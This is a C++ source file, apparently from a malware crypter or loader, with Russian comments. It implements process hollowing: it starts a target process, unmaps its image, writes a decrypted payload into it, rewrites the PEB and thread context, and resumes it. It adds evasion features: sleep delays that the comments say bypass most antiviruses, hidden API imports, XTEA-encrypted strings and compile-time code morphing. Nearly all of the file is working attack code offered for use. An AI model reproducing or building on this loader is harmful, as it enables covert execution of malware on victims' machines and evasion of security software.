#include <iostream>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>

#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/modules.h"
#include "../../modules/data_crypt_string.h"

#include "../../modules/metamorph_code/config.h"
#include "../../modules/metamorph_code/boost/preprocessor/repetition/repeat_from_to.hpp"
#include <boost/preprocessor/cat.hpp>
#include <boost/preprocessor/repetition/repeat_from_to.hpp>
#include "ntdll_undoc.h"
#include "createproc.h"
#include "relocate.h"
#include "pe_raw_to_virtual.h"

//Дефайн определяет задержку слипов, в данной реализации 1 секунда, два слипа. Т.е. запуск примерно через три секунды.
//Это позволяет обойти большинство антивирусов.
#define SLEEP_WAIT 50

//Функция раскриптовки строки
void str_to_decrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//Выровнить размер строки на 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//Расшифровка строки
	XTEA_decrypt(str_to_crypt, size_str, key, size_key);
}

//Функция криптовки строки
void str_to_encrypt(char *str_to_crypt, uint32_t size_str, uint32_t *key, uint32_t size_key)
{

	//Выровнить размер строки на 8:
	while (!!(size_str % 8)) {
		size_str++;
	}

	//Шифровка строки
	XTEA_encrypt(str_to_crypt, size_str, key, size_key);
}

/*
runPE: Функция загружает наш пейлоад:

base - Базовый адрес kernrl32.dll (Необходим для скрытия API)
targetPath - Путь до приложения, в которое мы хотим внедрить (Можно указать путь до себя, тогда будет создан ещё один процесс).
payload - Адрес буфера с расшифрованным PE
payload_size - размер буфера
requiredBase - адрес, по которому мы хотим отобразить полезную нагрузку в целевой памяти; NULL, если нам все равно.
Этот адрес будет игнорироваться, если у полезной нагрузки нет таблицы перемещений, потому что тогда он должен быть сопоставлен с исходной ImageBase.
unmap_target - Если хотим удалить карту цели? (мы не обязаны делать это, если это не мешает выбранной нами базе)
ntdll - Указатель на расшифрованную строку "ntdll.dll" (Необходим для скрытия API)
NtUnmapViewOfSection - Указатель на расшифрованную строку "NtUnmapViewOfSection" (Необходим для скрытия API)
*/

bool runPE(uintptr_t base, LPSTR targetPath, BYTE* payload, SIZE_T payload_size, ULONGLONG desiredBase = NULL, bool unmap_target = false, char* ntdll = NULL, char* NtUnmapViewOfSection = NULL)
{
	if (!load_ntdll_functions(base,ntdll, NtUnmapViewOfSection)) return false;

	//check payload:
	IMAGE_NT_HEADERS32* payload_nt_hdr32 = get_nt_hrds32(payload);
	if (payload_nt_hdr32 == NULL) {
		printf("Invalid payload: %p\n", payload);
		return false;
	}

	const ULONGLONG oldImageBase = payload_nt_hdr32->OptionalHeader.ImageBase;
	SIZE_T payloadImageSize = payload_nt_hdr32->OptionalHeader.SizeOfImage;

	//set subsystem always to GUI to avoid crashes:
	payload_nt_hdr32->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;

	//Морфинг кода при компиляции************************************************************
    #define DECL(z, n, text) BOOST_PP_CAT(text, n) ();
	BOOST_PP_REPEAT_FROM_TO(START_MORPH_CODE, END_MORPH_CODE, DECL, function)
   //Морфинг кода при компиляции************************************************************

	//create target process:
	PROCESS_INFORMATION pi;
	if (!create_new_process1(targetPath, pi)) return false;
	printf("PID: %d\n", pi.dwProcessId);

	//get initial context of the target:
#if defined(_WIN64)
	WOW64_CONTEXT context;
	memset(&context, 0, sizeof(WOW64_CONTEXT));
	context.ContextFlags = CONTEXT_INTEGER;
	Wow64GetThreadContext(pi.hThread, &context);
#else	
	CONTEXT context;
	memset(&context, 0, sizeof(CONTEXT));
	context.ContextFlags = CONTEXT_INTEGER;
	LI_GET(base, GetThreadContext)(pi.hThread, &context);
#endif
	//get image base of the target:
	DWORD PEB_addr = context.Ebx;
	printf("PEB = %x\n", PEB_addr);

	DWORD targetImageBase = 0; //for 32 bit
	if (!LI_GET(base, ReadProcessMemory)(pi.hProcess, LPVOID(PEB_addr + 8), &targetImageBase, sizeof(DWORD), NULL)) {
		printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
		return false;
	}
	if (targetImageBase == NULL) {
		return false;
	}
	printf("targetImageBase = %x\n", targetImageBase);

	if (has_relocations(payload) == false) {
		//payload have no relocations, so we are bound to use it's original image base
		desiredBase = payload_nt_hdr32->OptionalHeader.ImageBase;
	}

	if (unmap_target || (ULONGLONG)targetImageBase == desiredBase) {
		//unmap the target:
		if (_NtUnmapViewOfSection(pi.hProcess, (PVOID)targetImageBase) != ERROR_SUCCESS) {
			printf("Unmapping the target failed!\n");
			return false;
		}
	}

	//try to allocate space that will be the most suitable for the payload:
	LPVOID remoteAddress = LI_GET(base, VirtualAllocEx)(pi.hProcess, (LPVOID)desiredBase, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddress == NULL) {
		printf("Could not allocate memory in the remote process\n");
		return false;
	}
	printf("Allocated remote ImageBase: %p size: %lx\n", remoteAddress, static_cast<ULONG>(payloadImageSize));

	//change the image base saved in headers - this is very important for loading imports:
	payload_nt_hdr32->OptionalHeader.ImageBase = static_cast<DWORD>((ULONGLONG)remoteAddress);

	//first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
	//when it will be ready, we will copy it into the space reserved in the target process

	LPVOID localCopyAddress = LI_GET(base, VirtualAlloc)(NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (localCopyAddress == NULL) {
		printf("Could not allocate memory in the current process\n");
		return false;
	}
	printf("Allocated local memory: %p size: %lx\n", localCopyAddress, static_cast<ULONG>(payloadImageSize));

	if (!copy_pe_to_virtual_l(payload, payload_size, localCopyAddress)) {
		printf("Could not copy PE file\n");
		return false;
	}

	//if the base address of the payload changed, we need to apply relocations:
	if ((ULONGLONG)remoteAddress != oldImageBase) {
		if (apply_relocations((ULONGLONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
			printf("[ERROR] Could not relocate image!\n");
			return false;
		}
	}

	SIZE_T written = 0;
	// paste the local copy of the prepared image into the reserved space inside the remote process:
	if (!LI_GET(base, WriteProcessMemory)(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
		printf("[ERROR] Could not paste the image into remote process!\n");
		return false;
	}
	//free the localy allocated copy
	LI_GET(base, VirtualFree)(localCopyAddress, payloadImageSize, MEM_FREE);

	//overwrite ImageBase stored in PEB
	DWORD remoteAddr32b = static_cast<DWORD>((ULONGLONG)remoteAddress);
	if (!LI_GET(base, WriteProcessMemory)(pi.hProcess, LPVOID(PEB_addr + 8), &remoteAddr32b, sizeof(DWORD), &written) || written != sizeof(DWORD)) {
		printf("Failed overwriting PEB: %d\n", static_cast<int>(written));
		return false;
	}

	//overwrite context: set new Entry Point
	DWORD newEP = static_cast<DWORD>((ULONGLONG)remoteAddress + payload_nt_hdr32->OptionalHeader.AddressOfEntryPoint);
	printf("newEP: %x\n", newEP);
	context.Eax = newEP;
#if defined(_WIN64)
	Wow64SetThreadContext(pi.hThread, &context);
#else
	LI_GET(base, SetThreadContext)(pi.hThread, &context);
#endif
	//start the injected:
	printf("--\n");
	LI_GET(base, ResumeThread)(pi.hThread);

	//free the handles
	LI_GET(base, CloseHandle)(pi.hThread);
	LI_GET(base, CloseHandle)(pi.hProcess);
	return true;
}